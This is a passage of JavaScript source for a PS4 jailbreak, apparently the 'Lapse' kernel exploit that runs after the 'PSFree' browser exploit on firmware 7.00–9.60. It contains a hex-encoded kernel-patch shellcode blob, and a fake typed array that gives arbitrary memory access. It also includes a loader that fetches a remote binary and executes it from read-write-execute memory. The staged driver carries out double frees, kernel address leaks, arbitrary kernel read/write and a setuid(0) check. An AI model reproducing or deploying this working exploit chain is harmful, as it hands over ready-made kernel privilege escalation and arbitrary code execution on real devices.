      const kpatch0950_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c68136a51f00eb664489913b6d19006644899924f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c066898171770d00b8eb06000041b90100000041ba01000000668981b3770d0041bb498bffff48b84183bfa004000000488981bb770d00b804000000668981cd770d00b804000000668981da770d00b805000000c781c9770d00498b87d0c681cf770d0000c781d6770d00498bb7b0c681dc770d0000c781ee770d00498b8740668981f2770d00c681f4770d0000c781fb770d00498bb720668991ff770d00c68101780d0000c78113780d00498dbfc06689b117780d00c68119780d0000c7811f780d00498dbfe06644898123780d00c68125780d0000c78132780d00498dbf006644898936780d00c68138780d0000c7813e780d00498dbf206644899142780d00c68144780d0000664489994f780d00c68151780d00ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991e00e1001488b5008488991e80e1001488b5010488991f00e1001488b5018488991f80e1001488b5020488991000f1001488b4028488981080f100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0950_bin);
      break;
    default:
      die('kpatch_bin file not found');
      break;
  }
//  const buf = await get_patches(patch_elf_loc);
  var buf = kpatch_bin.buffer;
  // FIXME handle .bss segment properly
  // assume start of loadable segments is at offset 0x1000
  const patches = new View1(buf);
  var map_size = patches.size;
  const max_size = 0x10000000;
  if (map_size > max_size) {
    die(`patch file too large (>${max_size}): ${map_size}`);
  }
  if (map_size === 0) {
    die('patch file size is zero');
  }
  //log(`kpatch size: ${map_size} bytes`);
  map_size = (map_size + page_size) & -page_size;
  const prot_rwx = 7;
  const prot_rx = 5;
  const prot_rw = 3;
  const exec_p = new Int(0, 9);
  const write_p = new Int(max_size, 9);
  //log('open JIT fds');
  const exec_fd = sysi('jitshm_create', 0, map_size, prot_rwx);
  //const write_fd = sysi('jitshm_alias', exec_fd, prot_rw);
  //log('mmap for kpatch shellcode');
  const exec_addr = chain.sysp(
    'mmap',
    exec_p,
    map_size,
    prot_rx,
    MAP_SHARED | MAP_FIXED,
    exec_fd,
    0
  );
  const write_addr = chain.sysp(
    'mmap',
    write_p,
    map_size,
    prot_rw,
    MAP_SHARED | MAP_FIXED,
    exec_fd,
    0
  );
  //log(`exec_addr: ${exec_addr}`);
  //log(`write_addr: ${write_addr}`);
  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
    die('mmap() for jit failed');
  }
  //log('mlock exec_addr for kernel exec');
  sysi('mlock', exec_addr, map_size);
  // mov eax, 0x1337; ret (0xc300_0013_37b8)
  const test_code = new Int(0x001337b8, 0xc300);
  write_addr.write64(0, test_code);
  //log('test jit exec');
  sys_void('kexec', exec_addr);
  var retval = chain.errno;
  //log('returned successfully');
  //log(`jit retval: ${retval}`);
  if (retval !== 0x1337) {
    die('test jit exec failed');
  }
  const pipe_save = restore_info[1];
  restore_info[1] = pipe_save.addr;
  //log('mlock pipe save data for kernel restore');
  sysi('mlock', restore_info[1], page_size);
  // Restore tweaks from Al-Azif's source
  restore_info[4] = sysent_661_save.addr;
  //log('mlock sysent_661 save data for kernel restore');
  sysi('mlock', restore_info[4], page_size);
  //log('execute kpatch...');
  mem.cpy(write_addr, patches.addr, patches.size);
  sys_void('kexec', exec_addr, ...restore_info);
  //log('setuid(0)');
  //sysi('setuid', 0);
  //log('kernel exploit succeeded!');
  //log('restore sys_aio_submit()');
  //kmem.write32(sysent_661, sy_narg);
  // .sy_call = gadgets['jmp qword ptr [rsi]']
  //kmem.write64(sysent_661.add(8), sy_call);
  // .sy_thrcnt = SY_THR_STATIC
  //kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
}
//================================================================================================
// Create 32-bit Array from Address ==============================================================
//================================================================================================
// This function creates a "fake" Uint32Array that is backed by an
// arbitrary memory address 'addr' instead of its own data buffer.
function array_from_address(addr, size) {
  // 1. Create a normal, "original" (og) Uint32Array.
  //    Its actual contents don't matter.
  var og_array = new Uint32Array(0x1000);
  // 2. Get the memory address OF the 'og_array' JavaScript object itself.
  //    Then, add 0x10 (16 bytes) to it. This offset points to the
  //    internal metadata of the array, specifically where its
  //    "data pointer" (ArrayBufferView's 'data' field) is stored.
  var og_array_i = mem.addrof(og_array).add(0x10);
  // 3. --- This is the core of the exploit ---
  //    Overwrite the internal "data pointer" of 'og_array'.
  //    Instead of pointing to its own allocated buffer, make it point
  //    to the 'addr' that was passed into the function.
  mem.write64(og_array_i, addr);
  // 4. Overwrite the internal "length" property of 'og_array'.
  //    The array will now believe it has 'size' elements.
  //    (This offset, 0x8 bytes from the data pointer, is typical).
  mem.write32(og_array_i.add(0x8), size);
  // 5. Overwrite another internal field (likely capacity or a flag) to
  //    ensure the array is considered valid.
  mem.write32(og_array_i.add(0xc), 1);
  // 6. Push the 'og_array' to a special list (nogc = no garbage collection).
  //    This prevents the JavaScript engine from trying to "clean up"
  //    this corrupted object, which would likely cause a crash.
  nogc.push(og_array);
  // 7. Return the modified 'og_array'.
  //    Anyone using this array (e.g., `returned_array[0] = 0x...`)
  //    is NOT writing to a safe JavaScript buffer.
  //    They are writing directly to memory at 'addr'.
  return og_array;
}
//================================================================================================
// Payload Loader ================================================================================
//================================================================================================
// Allocate a small memory region (0x1000 bytes) using a system call (mmap).
// The flags 'PROT_READ | PROT_WRITE | PROT_EXEC' (RWX) are critical.
// This makes the memory Readable, Writable, and EXECUTABLE.
// This is a dangerous practice and is blocked by security measures in normal environments.
async function PayloadLoader(Pfile) {
  try {
    /*
    // Fetch the payload from payload.js
    var PLD = hex2uint8(payload_bin);
    // Calculate required padding to ensure the data length is a multiple of 4 bytes.
    // This is necessary because we will use Uint32Array (4 bytes per element) later.
    const originalLength = PLD.length;
    const paddingLength = (4 - (originalLength & 3)) & 3;
    // Create a new Uint8Array with the aligned size (original + padding)
    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
    // Copy the original payload data into the new buffer
    paddedBuffer.set(PLD, 0);
    */
    // Fetch the payload file (e.g., payload.bin) from the server
    const response = await fetch(Pfile);
    if (!response.ok) {
      throw new Error(`Payload ${Pfile} file read error: ${response.status}`);
    }
    var PLD = await response.arrayBuffer(); // Read the downloaded payload as an ArrayBuffer.
    // Calculate required padding to ensure the data length is a multiple of 4 bytes.
    // This is necessary because we will use Uint32Array (4 bytes per element) later.
    const originalLength = PLD.byteLength;
    const paddingLength = (4 - (originalLength & 3)) & 3;
    // Create a new Uint8Array with the aligned size (original + padding)
    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
    // Copy the original payload data into the new buffer
    paddedBuffer.set(new Uint8Array(PLD), 0);
    // If padding is needed, fill the remaining space with zeros
    if (paddingLength) paddedBuffer.set(new Uint8Array(paddingLength), originalLength);

    // Create a 32-bit integer view of the aligned payload buffer for copying
    const shellcode = new Uint32Array(paddedBuffer.buffer);
    // Allocate Executable, Writable, and Readable (RWX) memory using mmap system call.
    // 0x41000 = MAP_ANON | MAP_PRIVATE (Anonymous memory mapping)
    const payload_buffer = chain.sysp('mmap', 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
    // Create a custom JavaScript array view that points directly to the allocated native memory address
    const native_view = array_from_address(payload_buffer, shellcode.length);
    // Write the payload (shellcode) into the allocated executable memory
    native_view.set(shellcode);
    // Ensure the memory permissions are strictly set to RWX (Read/Write/Execute)
    chain.sys('mprotect', payload_buffer, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC);
    // Prepare the pthread structure and context for thread creation
    const ctx = new Buffer(0x10);
    const pthread = new Pointer();
    pthread.ctx = ctx;
    // Execute the payload by creating a new thread starting at the payload's memory address
    call_nze('pthread_create', pthread.addr, 0, payload_buffer, 0);
  } catch (e) {
    //log(`PayloadLoader error: ${e}`);
    return 0;
  }
  return 1;
}
//================================================================================================
// Cleanup Function ========================================================================
//================================================================================================
var block_fd, unblock_fd, current_core, current_rtprio, current_core_stored;
var sds, block_id, groom_ids, pktopts_sds, dirty_sd, sd_pair_main;
//================================================================================================
function doCleanup() {
  if (unblock_fd !== -1) {
    try {
      close(unblock_fd);
    } catch (e) {}
    unblock_fd = -1;
  }
  if (block_fd !== -1) {
    try {
      close(block_fd);
    } catch (e) {}
    block_fd = -1;
  }
  if (groom_ids !== null) {
    try {
      free_aios2(groom_ids.addr, groom_ids.length);
    } catch (e) {}
    groom_ids = null;
  }
  if (block_id !== 0xffffffff) {
    try {
      aio_multi_wait(block_id.addr, 1);
    } catch(e) {}
    try {
      aio_multi_delete(block_id.addr, block_id.length);
    } catch(e) {}
    block_id = 0xffffffff;
  }
  if (sds !== null) {
    for (const sd of sds) {
      try {
        close(sd);
      } catch(e) {}
    }
    sds = null;
  }
  if (pktopts_sds !== null) {
    for (const psd of pktopts_sds) {
      try {
        close(psd);
      } catch(e) {}
    }
  }
//  if (sd_pair_main !== null) {
//    try {
//      close(sd_pair_main[0]);
//    } catch(e) {}
//    try {
//      close(sd_pair_main[1]);
//    } catch(e) {}
//    sd_pair_main = null;
//  }
  if (current_core_stored > 0) {
    // Restore the thread's CPU core and realtime priority to maintain system stability during the exploit.
    // Stability tweaks from Al-Azif's source
    //log(`restoring core: ${current_core}`);
    //log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
      pin_to_core(current_core);
      set_rtprio(current_rtprio);
  }
}
//================================================================================================
// Lapse Exploit Function ========================================================================
//================================================================================================
async function doLapseExploit() {
  // overview:
  // * double free a aio_entry (resides at a 0x80 malloc zone)
  // * type confuse a evf and a ip6_rthdr
  // * use evf/rthdr to read out the contents of the 0x80 malloc zone
  // * leak a address in the 0x100 malloc zone
  // * write the leaked address to a aio_entry
  // * double free the leaked address
  // * corrupt a ip6_pktopts for restricted r/w
  // * corrupt a pipe for arbitrary r/w
  //
  // the exploit implementation also assumes that we are pinned to one core
  current_core_stored = 0;
  block_fd = -1;
  unblock_fd = -1;
  groom_ids = null;
  block_id = 0xffffffff;
  sds = null;
  pktopts_sds = null;
  sd_pair_main = null;
  try {
    // Save the thread's CPU core and realtime priority to maintain system stability during the exploit.
    // Stability tweaks from Al-Azif's source
    current_core = get_current_core();
    current_rtprio = get_current_rtprio();
    current_core_stored = 1;
    //log(`current core: ${current_core}`);
    //log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
    // if the first thing you do since boot is run the web browser, WebKit can
    // use all the cores
    const main_mask = new Buffer(sizeof_cpuset_t_);
    //const main_mask = new Long();
    get_cpu_affinity(main_mask);
    //log(`main_mask: ${main_mask}`);
    // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
    // spraying and grooming easier
    //log(`pinning process to core #${main_core}`);
    pin_to_core(main_core);
    //set_cpu_affinity(new Long(1 << main_core));
    get_cpu_affinity(main_mask);
    //log(`main_mask: ${main_mask}`);
    //log("setting main thread's priority");
    set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
    //sysi('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
    [block_fd, unblock_fd] = (() => {
      const unix_pair = new View4(2);
      sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
      return unix_pair;
    })();
    sds = [];
    for (var i = 0; i < num_sds; i++) {
      sds.push(new_socket());
    }
    window.log('Lapse Setup');
    await sleep(50); // Wait 50ms
    [block_id, groom_ids] = setup(block_fd);
    window.log('Lapse STAGE 1/5: Double free AIO queue entry');
    await sleep(50); // Wait 50ms
    sd_pair_main = double_free_reqs2(sds);
    window.log('Lapse STAGE 2/5: Leak kernel addresses');
    await sleep(50); // Wait 50ms
    const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair_main);
    window.log('Lapse STAGE 3/5: Double free SceKernelAioRWRequest');
    await sleep(50); // Wait 50ms
    [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair_main[0], sds);
    window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
    await sleep(50); // Wait 50ms
    const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
    window.log('Lapse STAGE 5/5: Patch kernel');
    await sleep(50); // Wait 50ms
    await patch_kernel(kbase, kmem, p_ucred, restore_info);
    doCleanup(); // Only works on success
    // Check if it all worked
    try {
      if (sysi('setuid', 0) == 0) {
        window.log("\nKernel exploit succeeded and AIO fixes applied", "green");
        return 1;
      } else {
        window.log("An error occured during if KEX succeeded test\nPlease restart console and try again...", "red");
      }
    } catch {
      // Still not exploited, something failed, but it made it here...
      die("kernel exploit failed!");
    }
  } catch (error) {
    window.log("An error occured during Lapse\nPlease restart console and try again...\nError definition: " + error, "red");
    
    // Al-Azif's minimal cleanup on failure
    if (unblock_fd !== -1) {
      try { close(unblock_fd); } catch (e) {}
      unblock_fd = -1;
    }
    return 0;

  } finally {
    // Always restore core and priority
    if (current_core_stored === 1) {
      try {
        pin_to_core(current_core);
        set_rtprio(current_rtprio);
      } catch (e) {}
    }
  }
}
//================================================================================================
function checkPlatformIsSupported() {
  var userAgent = navigator.userAgent;
  var psRegex = /PlayStation (4|5)[ \/]([0-9]{1,2}\.[0-9]{2})/;
  var match = userAgent.match(psRegex);
  if (!match) return false;
  var device = match[1];    // "4" or "5"
  var fwVersion = match[2]; // "9.00", "9.03", etc.
  // Convert "9.00" to 0x900
  config_target = parseInt(fwVersion.replace('.', ''), 16);
  window.log("Detected FW: PS" + device + " v" + fwVersion + ", Exploit Version: v2.2\n");
  // Supported FW lists
  var supportedFW = {
    "4": ["0.00",
          "7.00", "7.01", "7.02", "7.50", "7.51", "7.55",
          "8.00", "8.01", "8.03", "8.50", "8.52",
          "9.00", "9.03", "9.04", "9.50", "9.51", "9.60"],
    "5": ["0.00"]
  };
  // Check device exists
  if (!supportedFW[device]) return false;
  // FW control
  return supportedFW[device].indexOf(fwVersion) !== -1;
}
// Main Jailbreak Function
async function doJailBreak() {
  if (!checkPlatformIsSupported()) {
    window.log("Unsupported platform detected! Designed for PS4 [7.00 - 9.60]", "red");
    /*
    window.log("Running DEMO application...\n");
    window.log("Detected FW: PS4 v9.00\n");
    window.log("Starting PSFree Exploit...");
    window.log("PSFree STAGE 1/3: UAF SSV");
    window.log("PSFree STAGE 2/3: Get String Relative Read Primitive");
    window.log("PSFree STAGE 3/3: Achieve Arbitrary Read/Write Primitive");
    window.log("Achieved Arbitrary R/W\n");
    window.log("Starting Lapse Kernel Exploit...");
    window.log('Lapse Setup');
    window.log('Lapse STAGE 1/5: Double free AIO queue entry');
    window.log(' - Won race at attempt: 0');
    window.log('Lapse STAGE 2/5: Leak kernel addresses');
    window.log(' - Found reqs2 at attempt: 0');
    window.log(' - Found target_id at batch: 42');
    window.log('Lapse STAGE 3/5: Double free SceKernelAioRWRequest');
    window.log(' - Aliased pktopts at attempt: 0');
    window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
    window.log(' - Found reclaim sd at attempt: 0');
    window.log('Lapse STAGE 5/5: Patch kernel');
    window.log("\nKernel exploit succeeded and AIO fixes applied", "green");
    window.log("Homebrew Enabler loaded", "green");
    window.log("\nPSFree & Lapse exploit with AIO fixes by ABC");
    window.log("\nATTENTION: This device is not jailbroken!!!","red");
    window.log("This screen is shown for DEMO purposes only");
    */
    return;
  }
  var jb_step_status;
  if ((config_target >= 0x700) && (config_target < 0x1000)) { // 7.00 to 9.60
    Init_PSFreeGlobals();
    jb_step_status = await doPSFreeExploit();
    if (jb_step_status !== 1) return;
    window.log("Starting Lapse Kernel Exploit...");
    await sleep(200); // Wait 200ms
    jb_step_status = await doLapseInit();
    if (jb_step_status !== 1) return;
    jb_step_status = await doLapseExploit();
    if (jb_step_status !== 1) return;
    await sleep(500); // Wait 500ms

    if (sessionStorage.getItem('binloader')) {
      sessionStorage.removeItem('binloader');
      runBinLoader();
    }else{
      // Inject HEN payload
      jb_step_status = await PayloadLoader(sessionStorage.getItem('payload_path')); // Read payload from .bin file
      if (jb_step_status !== 1) {
        window.log("Failed to load HEN!\nPlease restart console and try again...", "red");
        return;
      }
      
      window.log("Homebrew Enabler loaded", "green");
      window.log("\nPSFree & Lapse exploit with AIO fixes by ABC");
      if (typeof jailbreakSuccess == "function"){
        jailbreakSuccess();
      }
    }
  }
  else {
    window.log("Kernel Exploit not implemented!", "red");
  }
}
//================================================================================================
window.script_loaded = 1;
